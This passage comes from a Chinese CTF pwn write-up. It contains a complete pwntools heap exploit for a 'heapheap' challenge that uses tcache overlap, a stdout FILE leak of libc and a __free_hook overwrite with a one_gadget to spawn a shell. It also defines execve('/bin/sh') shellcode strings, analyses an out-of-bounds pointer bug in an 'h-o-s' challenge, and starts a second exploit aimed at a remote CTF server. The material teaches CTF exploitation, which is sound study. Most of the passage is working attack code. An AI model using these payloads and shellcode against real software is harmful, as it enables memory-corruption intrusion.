<span class="line" data-line="4"><span style="color:#E1E4E8">elf </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> ELF(</span><span style="color:#9ECBFF">"heapheap"</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="5"><span style="color:#E1E4E8">libc </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> ELF(</span><span style="color:#9ECBFF">"./libc-2.27.so"</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="6"><span style="color:#F97583">def</span><span style="color:#B392F0"> dbg</span><span style="color:#E1E4E8">():</span></span>
<span class="line" data-line="7"><span style="color:#E1E4E8">    gdb.attach(p)</span></span>
<span class="line" data-line="8"><span style="color:#E1E4E8">    pause()</span></span>
<span class="line" data-line="9"></span>
<span class="line" data-line="10"><span style="color:#E1E4E8">s       </span><span style="color:#F97583">=</span><span style="color:#F97583"> lambda</span><span style="color:#E1E4E8"> data               :p.send(</span><span style="color:#79B8FF">str</span><span style="color:#E1E4E8">(data))</span></span>
<span class="line" data-line="11"><span style="color:#E1E4E8">sa      </span><span style="color:#F97583">=</span><span style="color:#F97583"> lambda</span><span style="color:#E1E4E8"> text,data          :p.sendafter(text, </span><span style="color:#79B8FF">str</span><span style="color:#E1E4E8">(data))</span></span>
<span class="line" data-line="12"><span style="color:#E1E4E8">sl      </span><span style="color:#F97583">=</span><span style="color:#F97583"> lambda</span><span style="color:#E1E4E8"> data               :p.sendline(</span><span style="color:#79B8FF">str</span><span style="color:#E1E4E8">(data))</span></span>
<span class="line" data-line="13"><span style="color:#E1E4E8">sla     </span><span style="color:#F97583">=</span><span style="color:#F97583"> lambda</span><span style="color:#E1E4E8"> text,data          :p.sendlineafter(text, </span><span style="color:#79B8FF">str</span><span style="color:#E1E4E8">(data))</span></span>
<span class="line" data-line="14"><span style="color:#E1E4E8">r       </span><span style="color:#F97583">=</span><span style="color:#F97583"> lambda</span><span style="color:#E1E4E8"> num</span><span style="color:#F97583">=</span><span style="color:#79B8FF">4096</span><span style="color:#E1E4E8">           :p.recv(num)</span></span>
<span class="line" data-line="15"><span style="color:#E1E4E8">ru      </span><span style="color:#F97583">=</span><span style="color:#F97583"> lambda</span><span style="color:#E1E4E8"> text               :p.recvuntil(text)</span></span>
<span class="line" data-line="16"><span style="color:#E1E4E8">uu32    </span><span style="color:#F97583">=</span><span style="color:#F97583"> lambda</span><span style="color:#E1E4E8">                    :u32(p.recvuntil(</span><span style="color:#9ECBFF">"</span><span style="color:#79B8FF">\xf7</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">)[</span><span style="color:#F97583">-</span><span style="color:#79B8FF">4</span><span style="color:#E1E4E8">:].ljust(</span><span style="color:#79B8FF">4</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">"</span><span style="color:#79B8FF">\x00</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">))</span></span>
<span class="line" data-line="17"><span style="color:#E1E4E8">uu64    </span><span style="color:#F97583">=</span><span style="color:#F97583"> lambda</span><span style="color:#E1E4E8">                    :u64(p.recvuntil(</span><span style="color:#9ECBFF">"</span><span style="color:#79B8FF">\x7f</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">)[</span><span style="color:#F97583">-</span><span style="color:#79B8FF">6</span><span style="color:#E1E4E8">:].ljust(</span><span style="color:#79B8FF">8</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">"</span><span style="color:#79B8FF">\x00</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">))</span></span>
<span class="line" data-line="18"><span style="color:#E1E4E8">lg      </span><span style="color:#F97583">=</span><span style="color:#F97583"> lambda</span><span style="color:#E1E4E8"> name,data          :p.success(name </span><span style="color:#F97583">+</span><span style="color:#9ECBFF"> "-> 0x</span><span style="color:#79B8FF">%x</span><span style="color:#9ECBFF">"</span><span style="color:#F97583"> %</span><span style="color:#E1E4E8"> data)</span></span>
<span class="line" data-line="19"></span>
<span class="line" data-line="20"><span style="color:#E1E4E8">sh_x86_18</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">"</span><span style="color:#79B8FF">\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80</span><span style="color:#9ECBFF">"</span></span>
<span class="line" data-line="21"><span style="color:#E1E4E8">sh_x86_20</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">"</span><span style="color:#79B8FF">\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80</span><span style="color:#9ECBFF">"</span></span>
<span class="line" data-line="22"><span style="color:#E1E4E8">sh_x64_21</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">"</span><span style="color:#79B8FF">\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05</span><span style="color:#9ECBFF">"</span></span>
<span class="line" data-line="23"></span>
<span class="line" data-line="24"><span style="color:#E1E4E8">hp </span><span style="color:#F97583">=</span><span style="color:#F97583"> 0x</span><span style="color:#79B8FF">2020C0</span></span>
<span class="line" data-line="25"></span>
<span class="line" data-line="26"><span style="color:#F97583">def</span><span style="color:#B392F0"> add</span><span style="color:#E1E4E8">(size,con):</span></span>
<span class="line" data-line="27"><span style="color:#E1E4E8">	sla(</span><span style="color:#9ECBFF">"Please input your choice: "</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="28"><span style="color:#E1E4E8">	sla(</span><span style="color:#9ECBFF">"Please input the size:"</span><span style="color:#E1E4E8">,size)</span></span>
<span class="line" data-line="29"><span style="color:#E1E4E8">	p.sendafter(</span><span style="color:#9ECBFF">"Data:"</span><span style="color:#E1E4E8">,con)</span></span>
<span class="line" data-line="30"></span>
<span class="line" data-line="31"><span style="color:#F97583">def</span><span style="color:#B392F0"> dele</span><span style="color:#E1E4E8">(idx):</span></span>
<span class="line" data-line="32"><span style="color:#E1E4E8">	sla(</span><span style="color:#9ECBFF">"Please input your choice: "</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="33"><span style="color:#E1E4E8">	sla(</span><span style="color:#9ECBFF">"Please input the index:"</span><span style="color:#E1E4E8">,idx)</span></span>
<span class="line" data-line="34"></span>
<span class="line" data-line="35"></span>
<span class="line" data-line="36"><span style="color:#F97583">for</span><span style="color:#E1E4E8"> i </span><span style="color:#F97583">in</span><span style="color:#79B8FF"> range</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">6</span><span style="color:#E1E4E8">):</span></span>
<span class="line" data-line="37"><span style="color:#E1E4E8">	add(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">f8</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">'a'</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="38"></span>
<span class="line" data-line="39"><span style="color:#E1E4E8">add(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">f0</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">'a'</span><span style="color:#E1E4E8">)</span><span style="color:#6A737D">#6</span></span>
<span class="line" data-line="40"><span style="color:#E1E4E8">add(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">80</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">'a'</span><span style="color:#E1E4E8">)</span><span style="color:#6A737D">#7</span></span>
<span class="line" data-line="41"><span style="color:#E1E4E8">add(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">f0</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">'a'</span><span style="color:#E1E4E8">)</span><span style="color:#6A737D">#8</span></span>
<span class="line" data-line="42"><span style="color:#E1E4E8">add(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">f0</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">'a'</span><span style="color:#E1E4E8">)</span><span style="color:#6A737D">#9</span></span>
<span class="line" data-line="43"></span>
<span class="line" data-line="44"><span style="color:#F97583">for</span><span style="color:#E1E4E8"> i </span><span style="color:#F97583">in</span><span style="color:#79B8FF"> range</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">6</span><span style="color:#E1E4E8">):</span></span>
<span class="line" data-line="45"><span style="color:#E1E4E8">	dele(i)</span></span>
<span class="line" data-line="46"></span>
<span class="line" data-line="47"><span style="color:#E1E4E8">dele(</span><span style="color:#79B8FF">9</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="48"><span style="color:#E1E4E8">dele(</span><span style="color:#79B8FF">6</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="49"><span style="color:#E1E4E8">dele(</span><span style="color:#79B8FF">7</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="50"><span style="color:#E1E4E8">dele(</span><span style="color:#79B8FF">8</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="51"></span>
<span class="line" data-line="52"><span style="color:#F97583">for</span><span style="color:#E1E4E8"> i </span><span style="color:#F97583">in</span><span style="color:#79B8FF"> range</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">7</span><span style="color:#E1E4E8">):</span></span>
<span class="line" data-line="53"><span style="color:#E1E4E8">    add(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">f0</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">'a'</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="54"></span>
<span class="line" data-line="55"><span style="color:#E1E4E8">add(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">f0</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">'a'</span><span style="color:#E1E4E8">)</span><span style="color:#6A737D">#9</span></span>
<span class="line" data-line="56"><span style="color:#E1E4E8">add(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">80</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">'a'</span><span style="color:#E1E4E8">)</span><span style="color:#6A737D">#8</span></span>
<span class="line" data-line="57"><span style="color:#E1E4E8">add(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">f0</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">'a'</span><span style="color:#E1E4E8">)</span><span style="color:#6A737D">#7</span></span>
<span class="line" data-line="58"></span>
<span class="line" data-line="59"><span style="color:#F97583">for</span><span style="color:#E1E4E8"> i </span><span style="color:#F97583">in</span><span style="color:#79B8FF"> range</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">6</span><span style="color:#E1E4E8">):</span></span>
<span class="line" data-line="60"><span style="color:#E1E4E8">    dele(i)</span></span>
<span class="line" data-line="61"><span style="color:#E1E4E8">    </span></span>
<span class="line" data-line="62"><span style="color:#E1E4E8">dele(</span><span style="color:#79B8FF">8</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="63"><span style="color:#E1E4E8">dele(</span><span style="color:#79B8FF">6</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="64"><span style="color:#E1E4E8">dele(</span><span style="color:#79B8FF">9</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="65"><span style="color:#E1E4E8">add(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">88</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">'a'</span><span style="color:#F97583">*0x</span><span style="color:#79B8FF">80</span><span style="color:#F97583">+</span><span style="color:#E1E4E8">p64(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">190</span><span style="color:#E1E4E8">))</span></span>
<span class="line" data-line="66"><span style="color:#E1E4E8">dele(</span><span style="color:#79B8FF">7</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="67"><span style="color:#F97583">for</span><span style="color:#E1E4E8"> i </span><span style="color:#F97583">in</span><span style="color:#79B8FF"> range</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">7</span><span style="color:#E1E4E8">):</span></span>
<span class="line" data-line="68"><span style="color:#E1E4E8">    add(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">f0</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">'a'</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="69"><span style="color:#E1E4E8">    </span></span>
<span class="line" data-line="70"><span style="color:#E1E4E8">dele(</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="71"><span style="color:#E1E4E8">add(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">f0</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">'a'</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="72"><span style="color:#F97583">for</span><span style="color:#E1E4E8"> i </span><span style="color:#F97583">in</span><span style="color:#79B8FF"> range</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">7</span><span style="color:#E1E4E8">):</span></span>
<span class="line" data-line="73"><span style="color:#E1E4E8">    dele(i)</span></span>
<span class="line" data-line="74"><span style="color:#E1E4E8">add(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">28</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">'</span><span style="color:#79B8FF">\x60\xe7</span><span style="color:#9ECBFF">'</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="75"><span style="color:#E1E4E8">add(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">80</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">'a'</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="76"><span style="color:#E1E4E8">add(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">80</span><span style="color:#E1E4E8">,p64(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">fbad1887</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">+</span><span style="color:#E1E4E8">p64(</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">+</span><span style="color:#E1E4E8">p64(</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">+</span><span style="color:#E1E4E8">p64(</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">+</span><span style="color:#E1E4E8">p8(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">58</span><span style="color:#E1E4E8">))</span></span>
<span class="line" data-line="77"><span style="color:#6A737D"># 0x7ffff79e2000 0x7ffff7dca2a0</span></span>
<span class="line" data-line="78"><span style="color:#E1E4E8">libc_base </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> uu64()</span><span style="color:#F97583">-0x</span><span style="color:#79B8FF">3E82A0</span></span>
<span class="line" data-line="79"><span style="color:#E1E4E8">lg(</span><span style="color:#9ECBFF">"libc_base"</span><span style="color:#E1E4E8">,libc_base)</span></span>
<span class="line" data-line="80"><span style="color:#E1E4E8">free_hook </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> libc_base</span><span style="color:#F97583">+</span><span style="color:#E1E4E8">libc.sym[</span><span style="color:#9ECBFF">"__free_hook"</span><span style="color:#E1E4E8">]</span></span>
<span class="line" data-line="81"><span style="color:#E1E4E8">one </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> libc_base</span><span style="color:#F97583">+0x</span><span style="color:#79B8FF">4f432</span></span>
<span class="line" data-line="82"><span style="color:#E1E4E8">dele(</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="83"><span style="color:#E1E4E8">dele(</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="84"><span style="color:#E1E4E8">add(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">20</span><span style="color:#E1E4E8">,p64(free_hook))</span></span>
<span class="line" data-line="85"><span style="color:#E1E4E8">add(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">20</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">'a'</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="86"><span style="color:#E1E4E8">add(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">20</span><span style="color:#E1E4E8">,p64(one))</span></span>
<span class="line" data-line="87"><span style="color:#E1E4E8">dele(</span><span style="color:#79B8FF">7</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="88"></span>
<span class="line" data-line="89"><span style="color:#E1E4E8">p.interactive()</span></span></code></pre>
<h3 id="h-o-s">h-o-s</h3>
<p>漏洞点如下</p>
<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line" data-line="1"><span style="color:#F97583">int</span><span style="color:#E1E4E8"> __cdecl __noreturn </span><span style="color:#B392F0">main</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">int</span><span style="color:#FFAB70"> argc</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">const</span><span style="color:#F97583"> char</span><span style="color:#F97583"> **</span><span style="color:#FFAB70">argv</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">const</span><span style="color:#F97583"> char</span><span style="color:#F97583"> **</span><span style="color:#FFAB70">envp</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="2"><span style="color:#E1E4E8">{</span></span>
<span class="line" data-line="3"><span style="color:#E1E4E8">  __int64 v3;</span><span style="color:#6A737D"> // rbx</span></span>
<span class="line" data-line="4"></span>
<span class="line" data-line="5"><span style="color:#B392F0">  setvbuf</span><span style="color:#E1E4E8">(stdout, </span><span style="color:#79B8FF">0</span><span style="color:#F97583">LL</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">0</span><span style="color:#F97583">LL</span><span style="color:#E1E4E8">);</span></span>
<span class="line" data-line="6"><span style="color:#B392F0">  memset</span><span style="color:#E1E4E8">(ptr, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">sizeof</span><span style="color:#E1E4E8">(ptr));</span></span>
<span class="line" data-line="7"><span style="color:#E1E4E8">  cmd </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> buf;</span></span>
<span class="line" data-line="8"><span style="color:#F97583">  while</span><span style="color:#E1E4E8"> ( </span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8"> )</span></span>
<span class="line" data-line="9"><span style="color:#E1E4E8">  {</span></span>
<span class="line" data-line="10"><span style="color:#B392F0">    fgets</span><span style="color:#E1E4E8">(cmd, </span><span style="color:#79B8FF">128</span><span style="color:#E1E4E8">, stdin);</span></span>
<span class="line" data-line="11"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> ( </span><span style="color:#F97583">!</span><span style="color:#B392F0">strncmp</span><span style="color:#E1E4E8">(cmd, </span><span style="color:#9ECBFF">"fill"</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">4</span><span style="color:#F97583">uLL</span><span style="color:#E1E4E8">) )</span></span>
<span class="line" data-line="12"><span style="color:#E1E4E8">    {</span></span>
<span class="line" data-line="13"><span style="color:#F97583">      if</span><span style="color:#E1E4E8"> ( n </span><span style="color:#F97583">></span><span style="color:#79B8FF"> 7</span><span style="color:#E1E4E8"> )</span></span>
<span class="line" data-line="14"><span style="color:#E1E4E8">      {</span></span>
<span class="line" data-line="15"><span style="color:#B392F0">        puts</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"full-|-enough"</span><span style="color:#E1E4E8">);</span></span>
<span class="line" data-line="16"><span style="color:#E1E4E8">      }</span></span>
<span class="line" data-line="17"><span style="color:#F97583">      else</span></span>
<span class="line" data-line="18"><span style="color:#E1E4E8">      {</span></span>
<span class="line" data-line="19"><span style="color:#B392F0">        __isoc99_scanf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"</span><span style="color:#79B8FF">%d%*c</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">size);</span></span>
<span class="line" data-line="20"><span style="color:#E1E4E8">        v3 </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> n;</span></span>
<span class="line" data-line="21"><span style="color:#FFAB70">        ptr</span><span style="color:#E1E4E8">[v3] </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">char</span><span style="color:#F97583"> *</span><span style="color:#E1E4E8">)</span><span style="color:#B392F0">malloc</span><span style="color:#E1E4E8">(size);</span><span style="color:#6A737D">         // malloc(-1)返回0，覆盖ptr为0</span></span>
<span class="line" data-line="22"><span style="color:#B392F0">        fgets</span><span style="color:#E1E4E8">(</span><span style="color:#FFAB70">ptr</span><span style="color:#E1E4E8">[n], size, stdin);</span></span>
<span class="line" data-line="23"><span style="color:#F97583">        ++</span><span style="color:#E1E4E8">n;</span></span>
<span class="line" data-line="24"><span style="color:#E1E4E8">      }</span></span>
<span class="line" data-line="25"><span style="color:#E1E4E8">    }</span></span>
<span class="line" data-line="26"><span style="color:#F97583">    else</span><span style="color:#F97583"> if</span><span style="color:#E1E4E8"> ( </span><span style="color:#F97583">!</span><span style="color:#B392F0">strncmp</span><span style="color:#E1E4E8">(cmd, </span><span style="color:#9ECBFF">"get"</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">3</span><span style="color:#F97583">uLL</span><span style="color:#E1E4E8">) )</span></span>
<span class="line" data-line="27"><span style="color:#E1E4E8">    {</span></span>
<span class="line" data-line="28"><span style="color:#F97583">      if</span><span style="color:#E1E4E8"> ( n </span><span style="color:#F97583">&#x3C;</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8"> )</span></span>
<span class="line" data-line="29"><span style="color:#E1E4E8">      {</span></span>
<span class="line" data-line="30"><span style="color:#B392F0">        puts</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"empty-nn-empty"</span><span style="color:#E1E4E8">);</span></span>
<span class="line" data-line="31"><span style="color:#E1E4E8">      }</span></span>
<span class="line" data-line="32"><span style="color:#F97583">      else</span></span>
<span class="line" data-line="33"><span style="color:#E1E4E8">      {</span></span>
<span class="line" data-line="34"><span style="color:#B392F0">        puts</span><span style="color:#E1E4E8">(</span><span style="color:#FFAB70">ptr</span><span style="color:#E1E4E8">[</span><span style="color:#F97583">--</span><span style="color:#E1E4E8">n]);</span><span style="color:#6A737D">                         // 越界读-1</span></span>
<span class="line" data-line="35"><span style="color:#B392F0">        free</span><span style="color:#E1E4E8">(</span><span style="color:#FFAB70">ptr</span><span style="color:#E1E4E8">[n]);</span><span style="color:#6A737D">                           // free当前堆块</span></span>
<span class="line" data-line="36"><span style="color:#FFAB70">        ptr</span><span style="color:#E1E4E8">[n] </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 0</span><span style="color:#F97583">LL</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="37"><span style="color:#E1E4E8">      }</span></span>
<span class="line" data-line="38"><span style="color:#E1E4E8">    }</span></span>
<span class="line" data-line="39"><span style="color:#F97583">    else</span></span>
<span class="line" data-line="40"><span style="color:#E1E4E8">    {</span></span>
<span class="line" data-line="41"><span style="color:#B392F0">      puts</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"I don't know---"</span><span style="color:#E1E4E8">);</span></span>
<span class="line" data-line="42"><span style="color:#E1E4E8">    }</span></span>
<span class="line" data-line="43"><span style="color:#E1E4E8">  }</span></span>
<span class="line" data-line="44"><span style="color:#E1E4E8">}</span></span></code></pre>
<p>存在 <code>ptr[-1]</code> 越界，由此可以在 <code>cmd</code> 空间内构造 <code>fakechunk</code> ，而且要保证 <code>puts</code> 后 <code>free</code> 的参数是可以正常 <code>free</code> 掉的。且只能 <code>free</code> 当前 <code>chunk</code> 。</p>
<p>在 <code>cmd</code> 布置 <code>fakechunk</code> ，<code>free</code> 到 <code>unsortedbin</code> 泄露 <code>libc</code> ，再次将 <code>fakechunk</code> 释放到 <code>tcache</code> ，制造 <code>overlap</code> ，然后将<code>freehook</code> 链入 <code>tcache</code> ，打 <code>freehook</code> 为 <code>system</code> 。</p>
<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line" data-line="1"><span style="color:#6A737D"># -*- coding: UTF-8 -*-</span></span>
<span class="line" data-line="2"><span style="color:#F97583">from</span><span style="color:#E1E4E8"> pwn </span><span style="color:#F97583">import</span><span style="color:#F97583"> *</span></span>
<span class="line" data-line="3"></span>
<span class="line" data-line="4"><span style="color:#E1E4E8">context.log_level </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> 'debug'</span></span>
<span class="line" data-line="5"><span style="color:#E1E4E8">context.terminal </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> [</span><span style="color:#9ECBFF">"/bin/tmux"</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">"sp"</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">"-h"</span><span style="color:#E1E4E8">]</span></span>
<span class="line" data-line="6"></span>
<span class="line" data-line="7"><span style="color:#E1E4E8">io </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> remote(</span><span style="color:#9ECBFF">'123.57.69.203'</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">5820</span><span style="color:#E1E4E8"> )</span></span>
<span class="line" data-line="8"><span style="color:#6A737D"># io = remote('127.0.0.1',49161 )</span></span>
<span class="line" data-line="9"><span style="color:#6A737D"># libc = ELF('./libc-2.31.so')</span></span>
<span class="line" data-line="10"><span style="color:#6A737D"># io = process('./hos')</span></span>
<span class="line" data-line="11"><span style="color:#E1E4E8">libc </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> ELF(</span><span style="color:#9ECBFF">'./libc.so.6'</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="12"><span style="color:#E1E4E8">elf </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> ELF(</span><span style="color:#9ECBFF">'./hos'</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="13"></span>
<span class="line" data-line="14"><span style="color:#E1E4E8">l64 </span><span style="color:#F97583">=</span><span style="color:#F97583"> lambda</span><span style="color:#E1E4E8">      :u64(io.recvuntil(</span><span style="color:#9ECBFF">"</span><span style="color:#79B8FF">\x7f</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">)[</span><span style="color:#F97583">-</span><span style="color:#79B8FF">6</span><span style="color:#E1E4E8">:].ljust(</span><span style="color:#79B8FF">8</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">"</span><span style="color:#79B8FF">\x00</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">))</span></span>
<span class="line" data-line="15"><span style="color:#E1E4E8">l32 </span><span style="color:#F97583">=</span><span style="color:#F97583"> lambda</span><span style="color:#E1E4E8">      :u32(io.recvuntil(</span><span style="color:#9ECBFF">"</span><span style="color:#79B8FF">\xf7</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">)[</span><span style="color:#F97583">-</span><span style="color:#79B8FF">4</span><span style="color:#E1E4E8">:].ljust(</span><span style="color:#79B8FF">4</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">"</span><span style="color:#79B8FF">\x00</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">))</span></span>
<span class="line" data-line="16"><span style="color:#E1E4E8">rl </span><span style="color:#F97583">=</span><span style="color:#F97583"> lambda</span><span style="color:#E1E4E8">	a</span><span style="color:#F97583">=</span><span style="color:#79B8FF">False</span><span style="color:#E1E4E8">		: io.recvline(a)</span></span>
<span class="line" data-line="17"><span style="color:#E1E4E8">ru </span><span style="color:#F97583">=</span><span style="color:#F97583"> lambda</span><span style="color:#E1E4E8"> a,b</span><span style="color:#F97583">=</span><span style="color:#79B8FF">True</span><span style="color:#E1E4E8">	: io.recvuntil(a,b)</span></span>
<span class="line" data-line="18"><span style="color:#E1E4E8">rn </span><span style="color:#F97583">=</span><span style="color:#F97583"> lambda</span><span style="color:#E1E4E8"> x			: io.recvn(x)</span></span>
<span class="line" data-line="19"><span style="color:#E1E4E8">sn </span><span style="color:#F97583">=</span><span style="color:#F97583"> lambda</span><span style="color:#E1E4E8"> x			: io.send(x)</span></span>
<span class="line" data-line="20"><span style="color:#E1E4E8">sl </span><span style="color:#F97583">=</span><span style="color:#F97583"> lambda</span><span style="color:#E1E4E8"> x			: io.sendline(x)</span></span>
<span class="line" data-line="21"><span style="color:#E1E4E8">sa </span><span style="color:#F97583">=</span><span style="color:#F97583"> lambda</span><span style="color:#E1E4E8"> a,b			: io.sendafter(a,b)</span></span>
<span class="line" data-line="22"><span style="color:#E1E4E8">sla </span><span style="color:#F97583">=</span><span style="color:#F97583"> lambda</span><span style="color:#E1E4E8"> a,b		: io.sendlineafter(a,b)</span></span>
<span class="line" data-line="23"><span style="color:#E1E4E8">irt </span><span style="color:#F97583">=</span><span style="color:#F97583"> lambda</span><span style="color:#E1E4E8">			: io.interactive()</span></span>
<span class="line" data-line="24"><span style="color:#E1E4E8">dbg </span><span style="color:#F97583">=</span><span style="color:#F97583"> lambda</span><span style="color:#E1E4E8"> text</span><span style="color:#F97583">=</span><span style="color:#79B8FF">None</span><span style="color:#E1E4E8">  : gdb.attach(io, text)</span></span>
